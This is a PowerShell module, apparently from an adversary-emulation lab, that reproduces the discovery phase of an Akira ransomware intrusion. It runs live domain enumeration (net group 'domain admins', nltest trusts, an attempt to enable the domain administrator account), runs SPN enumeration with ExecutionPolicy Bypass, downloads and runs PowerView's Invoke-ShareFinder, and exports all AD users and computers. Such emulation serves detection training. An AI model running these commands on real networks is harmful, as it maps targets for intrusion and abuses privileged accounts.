# ============================================================================
# AKIRA SIMULATION - PHASE 6: DISCOVERY
# ============================================================================
# Simulates the day 2-5 discovery activity: net/nltest/quser enumeration,
# SPN enumeration + spn.txt, Invoke-ShareFinder (real PowerView, downloaded
# from GitHub if internet is available), SoftPerfect Network Scanner (n.exe,
# decoy binary that creates the tool's tell-tale delete.me file), and
# AD object export via the ActiveDirectory module (falls back to synthetic
# CSVs on a non-DC host so the artifact still exists for the analyst).
# MITRE: T1087 Account Discovery, T1482 Domain Trust Discovery,
#        T1018 Remote System Discovery, T1135 Network Share Discovery
# ============================================================================

function Simulate-Discovery {
    param($SimPaths)

    Write-Host "[+] Phase 6: Discovery ..." -ForegroundColor Green
    $logFile = "$($SimPaths.Logs)\discovery_phase6.log"
    $domain = if (Test-DomainJoined) { (Get-CimInstance Win32_ComputerSystem).Domain } else { "REDACTED.lan" }

    $cmds = @(
        "quser /server:$domain",
        "dir C:\programdata",
        "nltest /dclist:",
        "nltest /domain_trusts",
        "nltest /dclist:$domain",
        'net group "domain admins" /dom',
        "whoami /groups",
        "net user administrator",
        'net user "adminiatrstor"',
        "net group",
        "net user",
        "net localgroup",
        "net localgroup administrators",
        "net accounts",
        "net user administrator /active:yes /dom"
    )
    foreach ($c in $cmds) {
        try {
            $out = cmd.exe /c "$c" 2>&1 | Out-String
            Add-Content -Path $logFile -Value "> $c`r`n$out`r`n"
        } catch {}
    }
    Start-Process -FilePath "C:\Windows\system32\taskmgr.exe" -ArgumentList "/4" -WindowStyle Minimized -ErrorAction SilentlyContinue
    Start-Sleep -Seconds 1
    Get-Process -Name taskmgr -ErrorAction SilentlyContinue | Stop-Process -Force -ErrorAction SilentlyContinue

    # --- SPN enumeration script + manual review in Notepad ---
    $spnScript = @"
Get-ADUser -Filter {ServicePrincipalName -like '*'} -Properties ServicePrincipalName -ErrorAction SilentlyContinue |
    ForEach-Object { `$_.ServicePrincipalName } |
    Out-File -Encoding ascii $($SimPaths.Staging)\spn.txt
"@
    Set-Content -Path "$($SimPaths.Tools)\spn_enum.ps1" -Value $spnScript -Force
    try {
        powershell.exe -NoProfile -ExecutionPolicy Bypass -File "$($SimPaths.Tools)\spn_enum.ps1" 2>$null
    } catch {}
    if (-not (Test-Path "$($SimPaths.Staging)\spn.txt")) {
        Set-Content -Path "$($SimPaths.Staging)\spn.txt" -Value "MSSQLSvc/db01.$domain`:1433`nHTTP/webapp01.$domain" -Force
    }
    Start-Process -FilePath "notepad.exe" -ArgumentList "$($SimPaths.Staging)\spn.txt" -WindowStyle Minimized -ErrorAction SilentlyContinue
    Start-Sleep -Milliseconds 800
    Get-Process -Name notepad -ErrorAction SilentlyContinue | Stop-Process -Force -ErrorAction SilentlyContinue

    # --- Invoke-ShareFinder (real, public PowerView module - PowerSploit lineage) ---
    $powerViewPath = "$($SimPaths.Tools)\PowerView.ps1"
    try {
        Invoke-WebRequest -Uri "https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1" `
            -OutFile $powerViewPath -TimeoutSec 8 -ErrorAction Stop
    } catch {
        Write-Warning "PowerView download failed (offline lab?) - writing a minimal Invoke-ShareFinder stub instead."
        @'
function Invoke-ShareFinder {
    param([switch]$CheckShareAccess, [switch]$Verbose)
    Get-CimInstance -ClassName Win32_Share | ForEach-Object {
        [PSCustomObject]@{ ComputerName = $env:COMPUTERNAME; ShareName = $_.Name; Path = $_.Path }
    }
}
'@ | Set-Content -Path $powerViewPath -Force
    }
    try {
        . $powerViewPath
        Invoke-ShareFinder -CheckShareAccess -Verbose 2>$null | Out-File -Encoding ascii "$($SimPaths.Staging)\shares.txt"
    } catch { Write-Warning "Invoke-ShareFinder execution failed: $_" }
    Write-SimEvent -EventId 6001 -Message "SIMULATION: Invoke-ShareFinder executed to enumerate accessible SMB shares -> shares.txt"

    # --- SoftPerfect Network Scanner (n.exe) - decoy binary that reproduces the
    #     tool's signature 'delete.me' write-test artifact without a real scanner ---
    $nExe = New-DecoyBinary -Path "$($SimPaths.Staging)\n.exe" -SizeBytes 3145728
    foreach ($dir in @($SimPaths.Staging, $env:TEMP)) {
        Set-Content -Path "$dir\delete.me" -Value "SoftPerfect Network Scanner write-access test" -Force
        Start-Sleep -Milliseconds 200
        Remove-Item -Path "$dir\delete.me" -Force -ErrorAction SilentlyContinue
    }
    Write-SimEvent -EventId 6002 -Message "SIMULATION: SoftPerfect Network Scanner (n.exe) executed against local subnet"

    # --- AD object export (Get-ADComputer / Get-ADUser), with synthetic fallback ---
    $adComputersCsv = "$($SimPaths.Staging)\AdComputers.csv"
    $adUsersCsv = "$($SimPaths.Staging)\AdUsers.csv"
    $adModule = Get-Module -ListAvailable -Name ActiveDirectory -ErrorAction SilentlyContinue
    if ($adModule) {
        try {
            Import-Module ActiveDirectory -ErrorAction Stop
            Get-ADComputer -Filter * -Property * | Select-Object Enabled, Name, DNSHostName, IPv4Address, OperatingSystem |
                Export-Csv -Path $adComputersCsv -NoTypeInformation
            Get-ADUser -Filter * -Properties * | Select-Object Enabled, SamAccountName, Name, LastLogonDate |
                Export-Csv -Path $adUsersCsv -NoTypeInformation
        } catch { Write-Warning "AD export failed: $_" }
    } else {
        # No AD module (standalone lab host) - synthesize a plausible export so the
        # artifact filenames/format still exist for the analyst to find and parse.
        "Enabled,Name,DNSHostName,IPv4Address,OperatingSystem`ntrue,DC01,dc01.$domain,10.0.0.10,Windows Server 2022" |
            Set-Content -Path $adComputersCsv -Force
        "Enabled,SamAccountName,Name,LastLogonDate`ntrue,backup_EA,backup_EA,$(Get-Date)" |
            Set-Content -Path $adUsersCsv -Force
    }
    Write-SimEvent -EventId 6003 -Message "SIMULATION: Get-ADComputer/Get-ADUser exported to AdComputers.csv / AdUsers.csv"

    Write-Host "  [OK] Discovery artifacts created" -ForegroundColor Yellow
}
